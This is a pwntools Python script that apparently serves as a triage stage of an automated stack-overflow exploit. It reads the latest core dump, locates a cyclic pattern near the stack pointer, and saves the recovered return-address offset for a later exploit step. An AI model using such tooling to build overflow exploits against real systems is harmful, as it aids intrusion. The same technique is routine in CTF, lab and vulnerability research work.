#!/usr/bin/env python3
import os
import glob
import struct
from pwn import *

context.log_level = 'error'
context.arch = 'amd64'

COREDUMP_DIR = "/shared/coredump/"
STATE_FILE = "/tmp/offset.txt"


def log(msg):
    print(f"[Triage] {msg}")


def find_latest_non_empty_core():
    core_files = glob.glob(os.path.join(COREDUMP_DIR, "*"))
    if not core_files:
        return None
    core_files = sorted(core_files, key=os.path.getctime, reverse=True)
    for path in core_files:
        try:
            if os.path.getsize(path) > 0:
                return path
        except OSError:
            continue
    return None


def try_cyclic_find_value(val64):
    low4 = val64 & 0xFFFFFFFF
    if low4 == 0:
        return -1
    try:
        r = cyclic_find(low4)
        if 0 <= r < 512:
            return r
    except Exception:
        pass
    try:
        r = cyclic_find(struct.pack("<I", low4))
        if 0 <= r < 512:
            return r
    except Exception:
        pass
    return -1


def recover_offset(core_path):
    core = Coredump(core_path)

    # Strategy 1: RSP-8 holds the overwritten return address after ret pops it.
    # cyclic bytes form a non-canonical address so CPU faults before updating RIP.
    # The bad return address lives at RSP-8 in the coredump.
    # cyclic_find returns the offset of saved RBP (r=96), ret addr is r+8=104.
    try:
        rsp = core.rsp
        log(f"  RSP = {rsp:#x}")
        bad_ret = u64(core.read(rsp - 8, 8))
        log(f"  *(RSP-8) = {bad_ret:#x}")
        r = try_cyclic_find_value(bad_ret)
        if 0 <= r < 512:
            ret_offset = r if r >= 100 else r + 8
            log(f"  [Strategy 1] cyclic offset={r} -> ret_offset={ret_offset}")
            return ret_offset
    except Exception as e:
        log(f"  [Strategy 1] failed: {e}")

    # Strategy 2: scan stack window around RSP for any cyclic 4-byte chunk
    try:
        rsp = core.rsp
        for delta in range(-256, 256, 4):
            try:
                chunk = core.read(rsp + delta, 4)
                r = cyclic_find(chunk)
                if 0 <= r < 512:
                    ret_offset = r if r >= 100 else r + 8
                    log(f"  [Strategy 2] stack scan rsp+{delta} cyclic={r} -> ret_offset={ret_offset}")
                    return ret_offset
            except Exception:
                continue
    except Exception as e:
        log(f"  [Strategy 2] failed: {e}")

    # Strategy 3: RIP / fault_addr (works when address happens to be canonical)
    for attr in ["rip", "fault_addr"]:
        try:
            val = getattr(core, attr, None)
            if val and val != 0:
                r = try_cyclic_find_value(val)
                if 0 <= r < 512:
                    ret_offset = r if r >= 100 else r + 8
                    log(f"  [Strategy 3] {attr}={val:#x} cyclic={r} -> ret_offset={ret_offset}")
                    return ret_offset
        except Exception:
            pass

    # All strategies failed — return -1, do NOT write offset.txt
    # exploit will continue with DISCOVERY or FALLBACK
    log("  All strategies failed, cannot determine offset dynamically.")
    return -1


def main():
    log("Starting automatic crash triage module...")

    latest_core = find_latest_non_empty_core()
    if not latest_core:
        log("No usable coredump found.")
        return

    log(f"Analyzing coredump: {latest_core}")

    try:
        offset = recover_offset(latest_core)
        if 16 <= offset <= 512:
            log(f"Recovered overflow offset: {offset}")
            with open(STATE_FILE, "w") as f:
                f.write(str(offset))
            log(f"Offset saved to {STATE_FILE}")
        else:
            log("Could not recover a valid offset from the coredump.")
    except Exception as e:
        log(f"Coredump analysis failed: {e}")


if __name__ == "__main__":
    main()